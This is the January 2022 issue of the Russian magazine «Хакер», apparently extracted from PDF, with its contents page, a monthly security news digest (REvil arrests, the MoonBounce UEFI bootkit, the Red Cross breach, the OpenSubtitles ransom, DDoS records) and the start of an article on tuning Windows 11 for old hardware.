
                              ПОДПИСКА НА «ХАКЕР»




Мы благодарим всех, кто поддерживает
редакцию и помогает нам компенсировать
авторам и редакторам их труд. Без вас
«Хакер» не мог бы существовать, и каждый
новый подписчик делает его чуть лучше.




                        Напоминаем, что дает годовая подписка:

                            год доступа ко всем материалам, уже
                        опубликованным на Xakep.ru;
                            год доступа к новым статьям, которые
                         выходят по будням;
                         полное отсутствие рекламы на сайте
                           (при условии, что ты залогинишься);
                         возможность скачивать выходящие
                       каждый месяц номера в PDF, чтобы
                           читать на любом удобном устройстве;
                       личную скидку 20%, которую
                      можно использовать для продления
                          годовой подписки. Скидка накапливается
                               с каждым продлением.

                         Если по каким-то причинам у тебя еще нет
                           подписки или она скоро кончится,
                              спеши исправить это!
                                                   Январь 2022
            № 274
CONTENTS

    MEGANews
  Все новое за последний месяц

    Отключить всё!
  Ускоряем работу Windows 11 на старом железе

    Твикинг Windows 11
  Настраиваем автообновления, антивирус и шифрование

    Твикинг Windows 11
  Настраиваем новую винду для комфортной работы

    Фемида дремлет
  Как работает обход защиты Themida

    Сны Фемиды
  Ломаем виртуальную машину Themida

    Ядерная гифка
  Как работает эксплоит zero-click для iMessage

    Разруливаем DTP
  Как взломать протокол DTP и совершить побег в другую сеть VLAN

    Проверка на прочность
  Как я исследовал защиту LKRG с помощью уязвимости в ядре Linux

    HTB Static
  Захватываем сервер через VPN и дыру в Xdebug

    HTB Developer
  Ломаем сайт на Django и реверсим приложение на Rust

    HTB Forge
  Эксплуатируем SSRF для доступа к критической информации

    HTB Previse
  Раскручиваем кривой редирект до полного захвата сайта

   M1 для хакера
  Тестируем Homebrew, виртуалки, Docker и Node на новой архитектуре Apple

    Сильный лебедь
  Делаем VPN на strongSwan и автоматизируем подключение в iOS

    Заплатка на асме
  Создаем панель инструментов для Windows на Flat Assembler

     Netdata
  Настраиваем простую бесплатную систему мониторинга

    Magentная аномалия
  Настраиваем ngnix для работы с Magento

    Путь индейца
  Нетривиальная настройка сервера Apache

    Титры
  Кто делает этот журнал
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru


В этом месяце: ФСБ арестовала  участников хак‑группы
REvil, эксперты  обнаружили UEFI-вредонос MoonBounce,
Canon вынуждена  объяснять  пользователям, как  обойти
защиту DRM, из‑за DDoS-атаки без связи осталась неболь‐
шая страна, неизвестные украли данные у Красного Креста,
а также другие интересные новости.





АРЕСТЫ
УЧАСТНИКОВ REVIL
В середине января 2022 года ФСБ и Следственный департамент МВД объ‐
явили об аресте 14 человек, связанных с хак‑группой REvil, а по 25 адресам
в Москве, Санкт‑Петербурге, Ленинградской и Липецкой областях прошли



       «Основанием для разыскных мероприятий послужило обращение ком-
       петентных органов США, сообщивших о лидере преступного сообщес-обыски.«
      тва и его причастности к посягательствам на информационные ресур-
     сы зарубежных высокотехнологичных компаний путем внедрения вре-
       доносного  программного  обеспечения,  шифрования  информации
      и вымогательства денежных средств за ее дешифрование, — гласило
       официальное сообщение ФСБ. — ФСБ России  установлен полный
       состав  преступного сообщества  „REvil“ и  причастность его членов
       к неправомерному обороту средств платежей, осуществлено докумен-
       тирование противоправной деятельности».                »
В   результате   обысков  были   изъяты   «денежные   средства:   свы‐
ше 426 000 000 рублей, в том числе в криптовалюте, 600 000 долларов США,
500 000 евро, а также компьютерная техника, криптокошельки, использовав‐
шиеся для совершения преступлений, 20 автомобилей премиум‑класса, при‐
обретенные на денежные средства, полученные преступным путем».
   Интересно, что, по данным западных СМИ, во время этих рейдов был
арестован человек, ответственный за взлом крупнейшего в США оператора
трубопроводов Colonial Pipeline.
   Colonial Pipeline, занимающийся транспортировкой топлива, пострадал
от атаки шифровальщика DarkSide в мае 2021 года. Эта атака, из‑за которой
в ряде штатов был введен режим ЧС, стала той самой соломинкой, способ‐
ной переломить спину верблюда: внимание правоохранительных органов
к шифровальщикам усилилось, и на хакерских форумах поспешили запретить
рекламу вымогательского ПО вообще.
    Хотя ответственность за атаку на Colonial Pipeline взяла на себя хак‑группа
DarkSide, а недавние задержания и обыски были связаны с REvil, не исклю‐
чено, что кто‑то из задержанных ранее «работал» в  другой  хак‑группе
или вовсе в обеих одновременно.
   Вскоре после арестов эксперты компании Trustwave изучили, о чем теперь
говорят в русскоязычном даркнете, и пришли к выводу, что многие преступни‐
ки  напуганы  случившимся и  больше не  считают  Россию  «безопасной
гаванью». Также нередко критикуют действия REvil, которые привели к краху
группы, и призывают других не подражать такому поведению.
   Многие в криминальном подполье убеждены, что самый большой провал
REvil — это показное хвастовство своими достижениями и нападения на мно‐
гомиллиардные  корпорации,  расположенные  в  странах, которые  могли
вынудить российское правительство принять меры.
   Также интересно, что многие преступники предполагают, будто операция
ФСБ на самом деле была лишь «шоу» для Запада и все случившееся не обер‐
нется серьезными проблемами для задержанных. Одной из возможных при‐
чин такой фальсификации называют желание России «задобрить США» и тем
самым избежать дополнительных экономических санкций.


400 000 000 ДОЛЛАРОВ В КРИПТОВАЛЮТЕ

По данным блокчейн‑аналитиков из компании Chainalysis, связанные с Северной Кореей
хакеры украли криптовалюту на сумму почти 400 миллионов долларов, взломав 7 компаний
в 2021 году. Годом ранее объем похищенных средств оценивался в 300 миллионов дол‐
ларов.

Согласно исследованию, 58% украденных средств пришлись на Ethereum (ETH), тогда как доля
биткоина (BTC) составила только 20% от украденных средств.





RCE В DARK SOULS
Разработчики серии игр Dark Souls были вынуждены временно отключить
ПК‑серверы Dark Souls (Remastered, Dark Souls 2, Dark Souls 3 и Dark Souls:
PtDE) из‑за опасной RCE-уязвимости, которая позволяла удаленно захватить
контроль над чужой машиной.
   Эксплоит для этой уязвимости был продемонстрирован широкой публике
прямо во время Twitch-стрима. Стример The Grim Sleeper играл в Dark Souls 3,
и уже в конце эфира с его компьютером начало происходить что‑то непонят‐
ное. Сначала игра просто вылетала раз за разом, а после неожиданно вклю‐
чилось автоматическое преобразование текста в речь от Microsoft, и син‐
тезированный голос принялся критиковать геймплей стримера.
   The Grim Sleeper был очень удивлен и сообщил, что сам по себе открылся
Microsoft PowerShell, то есть хакер использовал его для запуска скрипта,
который активировал функцию преобразования текста в речь.
   Похоже, что стример не просто стал жертвой случайного тролля. Судя
по  скриншоту из  Discord SpeedSouls, взломщик обнаружил  уязвимость
некоторое время назад и пытался связаться по этому поводу с разработ‐
чиками из FromSoftware, однако его проигнорировали, и тогда он начал взла‐
мывать стримеров, пытаясь привлечь внимание к проблеме.





При этом разработанный фанатами игры античит Blue Sentinel уже обновлен
и способен помешать эксплуатации уязвимости. Его создатели объяснили,
что циркулирующие по сети сообщения об утечке эксплоита в открытый дос‐
туп — ложь, ведь о том, как использовать эту проблему, знали только четыре
человека, двое из которых — разработчики Blue Sentinel, а еще двое — люди,
помогавшие «работать над этим». Скорее всего, речь о тех, кто обнаружил
баг.
   Разработчики и  представители Bandai Namco,  издателя Dark  Souls,
не  сообщили,  как  долго  серверы игр  будут  отключены, но  ясно,  что
над исправлением уязвимости уже работают. Отдельно подчеркивается, что
отключение не распространяется на PvP-серверы для Xbox и PlayStation.


YOUTUBE НЕ ДЛЯ НЕДОВОЛЬНЫХ
Подводя итоги 2021 года и обращаясь к создателям контента, глава YouTube Сьюзен Воджицки
(Susan Wojcicki) уделила внимание злободневной теме — недавнему отключению счетчика диз‐
лайков на YouTube. Судя по всему, возвращения конкретных цифр рядом с кнопкой «Не нравит‐
ся» можно не ждать.





          «От многих из вас мы слышим [жалобы] на удаление счетчика дизлайков→       на YouTube, и я знаю, что это решение было спорным. Некоторые из упомянутых
        дизлайков помогали решить, какие видео стоит смотреть. Однако видео могут
       не нравиться людям по разным причинам, в том числе по тем, которые не име‐
      ют никакого отношения к самим видео, а значит, это далеко не всегда [можно
        использовать] как точный критерий выбора видео для просмотра.
           Также мы заметили, что счетчик дизлайков наносит ущерб части нашей эко‐
       системы из‑за атак, в ходе которых люди активно „накручивали“ количество
        дизлайков под видео конкретного автора. Эти атаки  часто были нацелены
       на более мелких создателей контента и начинающих. Мы хотим, чтобы каждый
         чувствовал, что может выразить себя без притеснений»


— из выступления Воджицки





UEFI-МАЛВАРЬ
MOONBOUNCE
В конце 2021 года, изучая логи Firmware Scanner, эксперты «Лаборатории
Касперского» обнаружили компрометацию на уровне прошивки UEFI. Даль‐
нейший анализ показал, что злоумышленники модифицировали один из ком‐
понентов в исследуемом образе прошивки, а это позволило им изменить
цепочку выполнения в UEFI и внедрить вредоносный код, запускаемый
при старте машины.
   Проанализировав компоненты модифицированной прошивки и другие
артефакты вредоносной активности в сети жертвы, исследователи пришли
к выводу, что в исследуемую прошивку был внедрен вредоносный код,
который получил имя MoonBounce.
   Особенность MoonBounce в том, что малварь не скрывается в разделе
ESP (EFI System Partition), где обычно располагается часть кода UEFI, а сразу
внедряется во флеш‑память SPI, расположенную на материнской плате. То
есть вредонос может запускаться как после переустановки операционной
системы, так и после форматирования или замены жесткого диска. Фактичес‐
ки буткит останется на зараженном устройстве вплоть до перепрошивки SPI-
памяти (а это очень сложный процесс) или замены материнской платы.
  По информации исследователей, MoonBounce — это уже третий буткит
UEFI, который встречался ИБ‑аналитикам и был способен заражать SPI-
память. Предыдущие два случая — это малварь LoJax и MosaicRegressor.
   Исследователи заявили, что MoonBounce использовался как способ под‐
держивать доступ к зараженному хосту и развертывать малварь на втором
этапе атаки. Фактически пока MoonBounce был развернут только один раз
(в сети неназванной транспортной компании), и, основываясь на другой мал‐
вари,  развернутой  в  той же  сети,  исследователи  предположили,  что
MoonBounce — это работа китайской кибершпионской группировки APT41.





Так, MoonBounce и другие вредоносы, обнаруженные в сети жертвы, часто
связывались с одной и той же серверной инфраструктурой, откуда они, ско‐
рее всего, получали инструкции от APT41.
   Единственной загадкой для исследователей пока остался способ установ‐
ки и распространения MoonBounce.


НА 35% БОЛЬШЕ LINUX-МАЛВАРИ

Аналитики компании CrowdStrike подсчитали, что в 2021 году количество атак на Linux-девайсы
выросло на         . Чаще всего такая малварь атаковала IoT-устройства и использовала ихдля DDoS-атак.35%


Злоумышленники также используют умные устройства под управлением дистрибутивов Linux
для  майнинга  криптовалюты,  проведения  спам‑кампаний,  в  качестве  ретрансляторов
и управляющих серверов, а порой и вовсе как точку проникновения в корпоративные сети.

В 2021 году количество малвари для Linux выросло на 35% по сравнению с 2020 годом.

XorDDoS, Mirai и Mozi были наиболее распространенными семействами вредоносов, на их
долю приходилось 22% всех атак, нацеленных на Linux.

Mozi демонстрирует взрывной рост активности: за прошедший год в сети циркулировало
в 10 раз больше образцов этой малвари (по сравнению с предыдущим годом).

XorDDoS тоже показывает рост на 123% по сравнению с 2020 годом.





ВЗЛОМ КРАСНОГО
КРЕСТА
Один из сторонних подрядчиков Красного Креста в Швейцарии, отвечавший
за хранение данных, подвергся хакерской атаке, которая привела к утечке
личной информации 515 тысяч человек. Все эти люди входили в программу
«Восстановление семейных связей», которая помогает воссоединять семьи,
разлученные войной, стихийными бедствиями, миграцией.
  Об инциденте сообщил Международный комитет Красного Креста, по све‐
дениям которого, украденные злоумышленниками данные были собраны
как минимум 60  различными  филиалами  Красного  Креста и  Красного
Полумесяца по всему миру. О самой атаке и технических подробностях про‐
изошедшего в Красном Кресте практически ничего не сообщили, так как куда
больше представителей организации беспокоит возможная утечка похищен‐
ных данных.

      «Хотя мы не знаем, кто несет ответственность за эту атаку и почему
      они это сделали, у нас есть обращение к этим людям, — пишет«
      Роберт Мардини, генеральный директор Международного комитета
       Красного Креста. — Ваши действия потенциально могут причинить
     еще больше вреда и боли тем, кто уже перенес невыразимые стра-
      дания. Настоящие люди и настоящие семьи, стоящие за данными,
      которыми вы сейчас владеете, относятся к числу наименее влиятель-
      ных в мире. Пожалуйста, поступите правильно. Не делитесь этими
      данными, не продавайте, не разглашайте и не используйте их никаким
     иным образом».                »
Сайт программы «Восстановление семейных связей», на котором можно
подать запрос на помощь в поиске пропавших без вести членов семьи, вре‐
менно закрыт, а Красный Крест уже расследует случившееся.
  В организации «потрясены и озадачены» тем, что подобная гуманитарная
информация могла стать чьей‑то целью и подверглась компрометации.


НОВЫЙ DDOS-РЕКОРД: 3,47 ТБИТ/С

Стало известно, что в ноябре 2021 года компания Microsoft отразила масштабную DDoS-атаку,
нацеленную на клиента Azure из Азии. Мощность атаки составила 3,47 Тбит/с и 340 000 000
пакетов в секунду. При этом пиковая мощность еще одной атаки составила 3,25 Тбит/с (UDP-
атака на порты 80 и 443), а третьей — 2,55 Тбит/с (UDP-флуд на порт 443).

Атаки были нацелены на неназванного клиента Microsoft Azure из Азии и на сегодняшний день
являются самыми мощными из всех известных. Сообщается, что для организации DDoS были
задействованы более 10 000 машин со всего мира.





OPENSUBTITLES
ЗАПЛАТИЛИ ВЫКУП
Администрация сайта OpenSubtitles, который предоставляет бесплатные суб‐
титры для фильмов, сериалов и прочих видеоматериалов, призналась, что
в прошлом году ресурс был взломан. Напомню, что OpenSubtitles входит
в 5000 самых посещаемых сайтов в интернете по версии Amazon Alexa
и Tranco. Атака затронула данные 6,7 миллиона пользователей, но хакеры
получили выкуп и пообещали молчать.
   Сообщить о прошлогодней атаке OpenSubtitles вынудила произошедшая
на этой неделе утечка: украденные в прошлом году данные все же просочи‐
лись в сеть, и копию этих файлов уже проиндексировал сайт HaveIBeenPwned.
Как  заявляет  OpenSubtitles,  в  ходе  инцидента  были  украдены  дан‐
ные 6 783 158 пользователей, зарегистрированных на сайте. В руки зло‐
умышленников попали хеши email-адресов, имена пользователей и пароли
в виде MD5.


      «Сайт был создан в 2006 году, мы мало знали о безопасности, поэто-
     му пароли хранились в виде md5() без соли», — признают операторы«
       OpenSubtitles.                »
Фактически это означает, что большинство похищенных паролей можно легко
взломать, а на сайте уже появилось сообщение о том, что код OpenSubtitles
обновился и пользователям рекомендуется поменять пароли.
   Согласно официальному заявлению, взлом и вымогательство имели место
еще в августе 2021 года. Причем во взломе операторы сайта винят одного
из администраторов, который использовал слабый пароль.

      «В августе 2021 года мы получили сообщение в Telegram от хакера,
      который предоставил нам доказательства того, что он может получить«
       доступ к пользовательской таблице opensubtitles.org, и уже скачал
       оттуда SQL-дамп.
       Он  потребовал  выкуп  в  биткоинах,  чтобы  не  разглашать  эту
      информацию, и пообещал удалить все [украденные] данные.
      Мы с трудом согласились, потому что сумма была немалая. После
      хакер объяснил нам, как он смог получить доступ, и помог исправить
       ошибку. С  технической  точки  зрения он сумел  взломать  слабый
      пароль суперадмина и получил  доступ к незащищенному  скрипту,
      который был доступен только для суперадминистраторов. Этот скрипт
       позволял выполнять SQL-инъекции и извлекать данные», —  гласит
       официальное объяснение.                »

РЕКОРДНОЕ КОЛИЧЕСТВО УТЕЧЕК И ПЕРЕХВАТОВ BGP

Компания Qrator Labs подвела итоги четвертого квартала 2021 года. В своем отчете аналитики
отдельно отмечают рекордное количество уникальных BGP-инцидентов, связанных с перех‐
ватом трафика: в течение ноября 17 798 автономных систем сгенерировали перехваты BGP
(BGP Hijacks), что составило 16,3% от общего числа автономных систем в мире.

Другой «рекорд» BGP был поставлен по количеству  утечек маршрутов BGP (Rout Leaks)
за месяц. Так, декабрь 2021 года показал рекордное количество утечек маршрутов — более
10 000 000. Это почти в 2 раза больше, чем в первые два месяца четвертого квартала.





Суммарные же утечки маршрутов в четвертом квартале более чем в два раза превышают
показатели третьего квартала — 19 852 504 в четвертом квартале против 7 589 347 в третьем.





                                     Продолжение статьи →
← Начало статьи





 ПРОБЛЕМЫ INTEL
 И BLU-RAY
   Компания Intel отказалась от поддержки SGX (Software Guard Extension) в про‐
   цессорах Intel Core 11000 и 12000 12-го поколения. В результате машины
  с этими процессорами не смогут воспроизводить диски Blu-ray с разрешени‐
  ем 4K.
       Хотя в 2022 году диски Blu-ray могут показаться архаизмом, все не совсем
   так. Дело в том, что они по‑прежнему пользуются спросом, так как часто име‐
  ют коллекционную ценность, а также людям просто нравится иметь нечто
   физическое и осязаемое, а не только смотреть фильмы в онлайн‑киноте‐
   атрах. Кроме того, диски Blu-ray могут предложить 4K-контент без подклю‐
  чения к интернету, а качество и стабильность в данном случае гарантирова‐
   ны, в отличие от потоковой передачи.
     Проблемы с Blu-ray-дисками возникают из‑за того, что они защищены
  с помощью DRM, а для работы этой технологии требуется наличие SGX. Тех‐
  нология SGX, которую Intel представила еще в 2016 году в поколении Skylake,
   впервые позволила ПК воспроизводить защищенные диски  Blu-ray. Увы,
  теперь в спецификации процессоров Core 11-го и 12-го поколений тех‐
  нология SGX помечена как устаревшая, поэтому будет недоступна.
      Судя по всему, в компании решили отказаться от SGX из‑за того, что
   в последние годы ИБ‑специалисты обнаруживали все больше уязвимостей
   в технологии анклавов. Так как большинство пользователей не слишком тре‐
  вожит возможность воспроизведения Blu-ray на ПК, это решение было
  для компании простым.
     Компания CyberLink, разрабатывающая PowerDVD, уже обновила свой
  FAQ, сообщив о проблеме с новыми процессорами Intel и заявив, что решить
  ее невозможно.


          «Удаление функции SGX и ее совместимость с последними версиями
       ОС Windows и драйверами  поставили перед CyberLink серьезную «
          проблему, связанную с поддержкой воспроизведения Ultra HD Blu-ray
         в нашем плеере. Проблема настолько серьезна, что CyberLink больше
        не может поддерживать воспроизведение фильмов в формате Ultra
       HD Blu-ray на новых процессорах и новейших платформах Windows», —
          предупредили в CyberLink.                 »
   Пока разработчики популярного плеера могут посоветовать пользователям
  лишь оставаться на более старых процессорах Intel, а также не обновляться
  до Windows 11, чтобы избежать замены необходимых драйверов.


  ЦЕНТРОБАНК ПРОТИВ КРИПТОВАЛЮТ
    Недавно Центробанк выступил с предложением запретить в России выпуск, майнинг и обра‐
   щение криптовалют в любом виде. По мнению экспертов ЦБ, допуск криптовалют в российскую
   финансовую систему создаст «огромный риск финансовой стабильности, который через банки
   и других участников может заразить всю финансовую систему», а итогом станет «создание
   параллельной финансовой системы, не подчиняющейся правилам».
     С позицией ЦБ не согласились многие, включая даже российский Минфин, а свои мнения
   о ситуации высказали самые разные специалисты. Не остался в стороне и Павел Дуров.





              «Запрет  криптовалют,  предложенный  Центробанком  России,  приведет →           к  оттоку из страны  IT-специалистов и уничтожит ряд отраслей высокотех‐
           нологичной экономики.
           Ни одна развитая страна не запрещает криптовалюты. Причина: такой зап‐
          рет неизбежно затормозит развитие блокчейн‑технологий в целом. Эти тех‐
          нологии повышают эффективность и безопасность многих видов человеческой
            деятельности — от финансов до искусства.
              Россия сегодня — один из лидеров по количеству высококлассных спе‐
           циалистов  блокчейн‑индустрии. Вдумчивое  регулирование  позволит  стране
           сбалансировать  распределение сил в международной финансовой системе
         и стать одним из крупных игроков новой экономики.
             Стремление регулировать хождение криптовалют естественно со стороны
         любого финансового органа. Однако, рекомендуя наложить тотальный запрет
          на криптовалюты, ЦБ РФ предлагает выплеснуть с водой и ребенка. Такой зап‐
          рет едва ли остановит недобросовестных игроков, но поставит крест на легаль‐
         ных российских проектах в этой сфере»


  — Дуров в своем Telegram-канале





 CANON УЧИТ
 ОБХОДИТЬ DRM
   Компания Canon столкнулась с дефицитом чипов, которыми обычно осна‐
   щаются оригинальные картриджи с чернилами и тонером. В итоге было при‐
   нято решение временно производить картриджи без чипов, и производитель
   официально сообщил, как обойти DRM-защиту и использовать такие рас‐
   ходники.
    Ни для кого не секрет, что принтеры и МФУ уже давно содержат DRM-
   защиту, которая не позволяет применять сторонние картриджи с чернилами
  и тонером. Компании — производители принтеров заявляют, что оригиналь‐
  ные картриджи с чипами могут «повысить качество и производительность»
   оборудования, а также обеспечивают «наилучшее потребительское качество»
  и защищают устройства от сторонних подделок.
    При этом продажа расходников обеспечивает компаниям немалую часть
   дохода. К примеру, компания Gillette придумала продавать ручки для своих
  бритв по дешевке, чтобы затем продать больше насадок для них, и с годами
  такую модель с энтузиазмом переняли и производители принтеров, включая
   Lexmark, HP, Canon и Brother.
     Обычно производители встраивают специальные чипы в свои картриджи,
   чтобы принтеры «аутентифицировали» расходный материал. Однако теперь,
   в условиях нехватки чипов, от этого приходится отказываться. В частности,
   компания Canon была вынуждена сообщить своим немецким клиентам,
   как обойти DRM-защиту.

         «Из‑за продолжающейся  нехватки полупроводниковых  компонентов
         во всем мире Canon столкнулась с проблемами в закупке определен- «
        ных  электронных  компонентов, которые используются в расходных
         материалах для наших МФУ, — гласит сообщение на немецком сайте
         службы поддержки Canon. — Чтобы обеспечить непрерывную и надеж-
        ную  поставку расходных материалов, мы решили  поставлять рас-
        ходные материалы без полупроводниковых компонентов до тех пор,
         пока ситуация с поставками не нормализуется».                 »
   Нужно сказать, что ставший дефицитным чип сообщает принтеру, когда уро‐
  вень тонера становится низким. Полезная функция, но ее также используют
  для блокировки сторонних картриджей — без чипа принтер не узнает, сколь‐
   ко чернил или тонера осталось в картридже, предположит, что тот пуст,
  и откажется печатать.
     Как теперь сообщает Canon, ПО принтеров позволяет относительно прос‐
   то обойти эту проверку. Когда после установки картриджа появится сооб‐
  щение об ошибке, пользователи могут нажать просто  «I Agree», «Close»
  или «OK» и продолжить использовать устройство как обычно. Есть лишь один
  нюанс: используя расходники без чипов, пользователи не получат предуп‐
   реждений о том, что чернила или тонер в их устройстве скоро закончатся.


  45 МИНУТ НА ВЗЛОМ

   По оценкам специалистов компании Positive Technologies, если в сетевом периметре компании
    присутствует трендовая уязвимость с публичным эксплоитом, то на проникновение в сеть зло‐
   умышленнику понадобится около 45 минут.

   К «трендовым» проблемам специалисты относят популярные у киберпреступников уязвимости,
   которые могут начать массово использоваться в ближайшее время. С такими багами злоумыш‐
   леннику не нужны ни особые навыки в проведении анализа защищенности, ни навыки прог‐
   раммирования. По данным экспертов, для 80% уязвимостей, используемых в атаках злоумыш‐
   ленниками в 2020–2021 годах, существовали публично доступные эксплоиты.





 LET’S ENCRYPT
 ОТЗЫВАЕТ
 СЕРТИФИКАТЫ
  28 января 2022 года некоммерческая организация Let’s Encrypt отозвала око‐
  ло двух миллионов SSL/TLS-сертификатов, поскольку те были выпущены
   некорректно.
    В официальном сообщении инженер Let’s Encrypt Джиллиан Тесса (Jillian
   Tessa) объяснила, что 25 января некая третья сторона сообщила организации
  о двух проблемах в коде имплементации метода проверки «TLS с исполь‐
   зованием ALPN» (BRs 3.2.2.4.20, RFC 8737) в Boulder — программном обес‐
  печении для ACME (Automatic Certificate Management Environment).


        «Все активные сертификаты, которые были выпущены и проверены
         с помощью TLS-ALPN-01 до 00:48 UTC 26 января 2022 года, когда был «
          развернут наш патч, считаются выпущенными некорректно», — пишет
           Тесса.                 »
  По оценкам  организации, проблема затронула менее одного  процента
   активных сертификатов. Однако это все равно огромное количество — около
   двух миллионов сертификатов, так как в настоящее время в мире активно
   около 221 миллиона сертификатов, выданных Let’s Encrypt. Все, кого кос‐
   нулась эта проблема, должны получить уведомления по электронной почте,
  и им понадобится продление сертификата.


 ОПАСНОСТЬ СТАРЫХ ДОМЕНОВ
  22,3% устаревших доменов могут быть опасны. К таким выводам пришли эксперты Palo Alto
   Networks, которые еще в сентябре прошлого года следили за десятками тысяч доменов ежед‐
   невно. Специалисты почерпнули идею для этого исследования во время атаки на компанию
   SolarWinds, когда выяснилось, что злоумышленники полагались на домены, зарегистрирован‐
   ные за несколько лет до непосредственного начала вредоносной активности.


   После тщательного наблюдения за множеством доменов исследователи пришли к выводу, что
   примерно 3,8% из них явно вредоносны, 19% — подозрительны и 2% — небезопасны
   для рабочей среды.





   Очевидным признаком вредоносного домена эксперты называют внезапный всплеск тра-
  фика. К тому же домены, не предназначенные для обычного использования, имеют неполный,
    клонированный или сомнительный  контент.  Также  отсутствуют  данные о  владельце
   в WHOIS. Еще одним явным признаком вредоносного старого домена служит создание под‐
   доменов с использованием DGA (domain generation algorithm).

   Одним из примечательных случаев, описанных в отчете, стала шпионская кампания Pegasus,
   в которой использовались два C&C-домена, зарегистрированных еще в 2019 году и «прос‐
   нувшихся» в июле 2021 года. Домены с DGA сыграли важную роль в той кампании: на них
   пришлось 23,22% трафика в день активации, что в 56 раз превышало обычные объемы DNS-
   трафика. Через несколько дней трафик и вовсе достиг 42,04%.





 DDOS ЦЕЛОЙ
 СТРАНЫ
   Организованный Twitch турнир по Minecraft, смоделированный по правилам
   популярного сериала Netflix «Игра в кальмара», стал причиной мощных DDoS-
   атак на единственного интернет‑провайдера Андорры. Атаки ударили по про‐
   вайдеру Andorra Telecom и на несколько часов отключили связь по всей стра‐
   не.
     Все  атаки совпадали по времени с прямыми трансляциями турнира
   Squidcraft Games, который предлагал победителю приз в размере 100 тысяч
   долларов США и был открыт  только для испаноязычных пользователей
  из стран Европы и Латинской Америки. Начиная со второго дня соревнований
   DDoS-атаки мешали  игрокам из Андорры  подключиться  к  турниру,  так
   как местный интернет‑провайдер не справлялся с объемом поступающего
   трафика.
    В итоге более десяти игроков из Андорры, включая стримеров Auron, Grefg
  и Vicens, вынуждены были отказаться от участия в турнире, оставив борьбу
  за приз игрокам из Испании и Латинской Америки.
      ИБ‑специалисты сообщали, что некоторые из атак достигали пиковой
  мощности 100 Гбит/с. При этом атаки были связаны с известными сервисами
  DDoS по найму, то есть, похоже, некто, не имеющий собственного ботнета,
   купил доступ к «огневой мощи» именно ради проведения атак во время тур‐
   нира.


  400 000 ДОЛЛАРОВ ЗА УЯЗВИМОСТИ В MICROSOFT
  OUTLOOK

    Известный  брокер  эксплоитов  и  уязвимостей  Zerodium  объявил,  что  готов  выплатить
   до 400 000 долларов за уязвимости нулевого дня, которые позволят осуществить удаленное
   выполнение кода в почтовом клиенте Microsoft Outlook. Ранее размер максимальной выплаты
   составлял 250 000 долларов. За аналогичные баги в Mozilla Thunderbird компания готова зап‐
   латить до 200 000 долларов.


   Вознаграждения за баги в Mozilla Thunderbird и Microsoft Outlook были увеличены временно.
   Zerodium не уточняет, на какую платформу должны быть ориентированы эксплоиты, но оба поч‐
   товых клиента имеют версии для всех трех основных операционных систем — Windows, macOS
   и Linux.





 NFT ВСЕ-ТАКИ СКАМ
   Разработчики крупнейшего NFT-маркетплейса OpenSea сообщили, что око‐
  ло 80% созданных бесплатно NFT — это мошенничество, плагиат или спам.
  Из‑за этого торговая площадка взяла курс на ограничение количества бес‐
   платных NFT, которые может создать пользователь.
      Новости о различном скаме и мошенничестве, связанном с NFT, появ‐
   ляются едва ли не каждый день. К примеру, недавно в Minecraft собирались
   запустить сервер Blockverse, на котором пользователи могли бы создавать
  NFT во время игры, а затем продавать их. Чтобы попасть на сервер, игроки
   должны были приобрести у разработчиков NFT, продажа которых стар‐
  товала 24 января 2022 года. Но когда все 10 тысяч невзаимозаменяемых
  токенов были проданы за считаные минуты, создатели проекта перестали
   входить на связь и исчезли, «заработав» таким способом около 1,2 миллиона
   долларов.
      Создатели  крупных  торговых  площадок  для NFT  прекрасно  знают
  о количестве скама, окружающего невзаимозаменяемые токены. И теперь
   создатели OpenSea рассказали, какая часть NFT-активности на платформе
   относится к мошенничеству и плагиату.
      Сначала разработчики OpenSea объявили, что ограничат создание бес‐
   платных NFT до 50, то есть именно столько пользователь сможет создавать
   бесплатно с помощью инструментов платформы. Так называемый ленивый
   минтинг позволяет пользователям не платить комиссию за газ при создании
  NFT на OpenSea (при этом покупатель в итоге платит комиссию во время
   сделки), поэтому сервис весьма популярен.
      Такое решение OpenSea вызвало бурю негодования среди пользовате‐
   лей, многие из которых жаловались, что теперь не могут создавать NFT вовсе.
   Вскоре после этого OpenSea объявила, что снимет ограничения, но также
   привела некоторые аргументы в пользу таких мер: компания заявила, что бес‐
   платный инструмент в основном используется в мошеннических целях.


        «В последнее время мы наблюдаем экспоненциальный рост злоупот-
         реблений  этой   функцией.  Более  80%  предметов,  созданных «
         с помощью  этого  инструмента, были плагиатом, коллекциями‑под-
         делками или спамом, — пишут разработчики в  Twitter. — Помимо
         отмены решения, мы уже  прорабатываем ряд  других мер,  чтобы
          гарантировать,  что мы  поддерживаем  создателей,  одновременно
         сдерживая злоумышленников».                 »
  СМИ отмечают, что, предпринимая подобные шаги, OpenSea рискует своей
   репутацией, но происходящее дает некоторое представление о масштабах
  проблемы мошенничества, связанного с бесплатным созданием NFT.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

    Атака NoReboot позволяет создать видимость выключения iPhone


   Создатели трояна Ragnatela случайно заразили им собственные машины


    Разработчик умышленно испортил npm-библиотеки colors и faker, заявляя, что Аарона Шварца
    убили


   Подросток получил удаленный доступ к 25 автомобилям Tesla


    Эксперты создали инструмент для решения CAPTCHA в даркнете


  В даркнете закрывается кардерский маркетплейс UniCC


   ProtonMail будет блокировать пиксели‑трекеры и скрывать IP-адреса


   Шифровальщик DeadBolt взломал 3600 NAS. Qnap устанавливает обновления принудительно


   Уязвимость в ядре Linux может использоваться для побега из контейнеров Kubernetes


    Хактивисты утверждают, что взломали белорусскую железную дорогу
COVERSTORY
  ОТКЛЮЧИТЬ
 ВСЁ!

     УСКОРЯЕМ РАБОТУ WINDOWS 11
         НА СТАРОМ ЖЕЛЕЗЕ





Я люблю смелые эксперименты. В качестве
одного из них я решил водрузить Windows
11 на старенький ThinkPad x200S. Новая
винда сначала не хотела устанавливаться
на этот ноут (потому что он древний и тор‐      Валентин Холмогоров                                                                                               valentin@holmogorov.ru
мозной),  а  потом  нормально  работать
на нем — по той же самой причине. Приш‐
лось  разбираться,  как  обойти  проверку
аппаратной совместимости, а самое глав‐
ное — как  заставить  систему  крутиться
быстро и без лагов на морально устарев‐
шем  железе.  Этими  способами  я  хочу
поделиться с тобой — все они проверены
на практике и гарантированно работают.


Этот старенький ThinkPad, оборудованный процессором Intel Celeron U2300,
8 Гбайт оперативки и SSD-накопителем всемирно известной китайской фир‐
мы NoNaMe, я использую в дальних поездках по принципу «если сопрут, то
не жалко». С ролью портативной рабочей машины этот компактный ноут всег‐
да справлялся безупречно, особенно с учетом того, что Windows 10 работала
на нем весьма шустро даже без всяких твиков. Именно поэтому у меня
